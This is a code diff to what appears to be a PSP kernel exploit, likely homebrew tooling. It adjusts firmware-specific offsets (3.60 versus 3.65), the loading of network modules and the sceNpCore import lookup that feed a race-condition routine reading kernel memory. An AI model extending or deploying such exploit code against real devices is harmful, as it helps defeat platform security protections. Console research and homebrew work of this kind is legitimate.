@@ -43,7 +43,7 @@ int (*_sceNpCore_8AFAB4A0)(int *input, char *string, int length);
 static volatile int running;
 static volatile int idx;
 static int input[3];
-static int libc_clock_offset = LIBC_CLOCK_OFFSET_365;
+static int libc_clock_offset = LIBC_CLOCK_OFFSET_360;
 
 static int racer(SceSize args, void *argp) {
   running = 1;
@@ -97,20 +97,15 @@ void repairInstruction(KernelFunctions* k_tbl) {
 }
 
 int stubScanner(UserFunctions* tbl){
+    int res = 0;
     g_tbl = tbl;
     tbl->freeMem(tbl);
-    if (g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON) < 0)
-        return -1;
 
-    if (g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON) < 0)
-        return -2;
-
-    if (g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET) < 0)
-        return -3;
-    
+    g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON);
+    g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON);
+    g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);
     _sceNpCore_8AFAB4A0 = tbl->FindImportUserRam("sceNpCore", 0x8AFAB4A0);
-    if (_sceNpCore_8AFAB4A0 == NULL) return -4;
-    
+
     return 0;
 }
 
@@ -129,12 +124,13 @@ int doExploit(void) {
     int res;
     u32 seed = 0;
     
-    u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
-
-    if (test_val == 0x8F154E38)
-      seed = readKram(SYSMEM_SEED_OFFSET_365);
-    else
-      libc_clock_offset = LIBC_CLOCK_OFFSET_360;
+    if (_sceNpCore_8AFAB4A0 != NULL){
+      u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
+      if (test_val == 0x8F154E38){
+        seed = readKram(SYSMEM_SEED_OFFSET_365);
+        libc_clock_offset = LIBC_CLOCK_OFFSET_365;
+      }
+    }
 
     // Allocate dummy block to improve reliability
     char dummy[32];
